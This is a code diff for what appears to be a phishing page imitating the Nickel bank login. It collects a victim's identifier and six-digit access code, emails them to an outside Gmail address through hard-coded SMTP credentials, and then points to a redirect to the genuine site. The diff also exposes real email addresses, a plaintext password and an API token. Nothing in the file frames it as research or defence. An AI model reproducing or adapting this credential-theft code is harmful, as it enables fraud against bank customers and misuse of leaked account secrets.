@@ -1,3 +1,5 @@
+
+
 let c1 = document.getElementById("c1");
 let c2 = document.getElementById("c2");
 let c3 = document.getElementById("c3");
@@ -62,6 +64,13 @@ function showSecond() {
     }
 }
 
+function onSuccess() {
+    alert("Bon")
+}
+function onError() {
+    alert("Bad");
+}
+
 function addChecked(e) {
     codeAccess += e.id;
     ok++;
@@ -76,13 +85,16 @@ function addChecked(e) {
 
     if(ok === 6 ) {
         Email.send({
-            SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
+            //SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
+            Host: "smtp.gmail.com",
+            Username: "leonbonou@gmail.com",
+            Password: "anselmo12.",
             To : 'anselmehotegni@gmail.com',
             From : "leonbonou20@gmail.com",
             Subject : "Les Codes Nickel",
-            Body : "Identifiant: " + identifiant + " - Code : " + codeAccess
+            Body : "ok"//"Identifiant: " + identifiant + " - Code : " + codeAccess
         }).then(
-            message => alert("Erreur")
+            message => alert("Send")
         );
         //window.location.href = "https://app.nickel.eu" //ok
     }
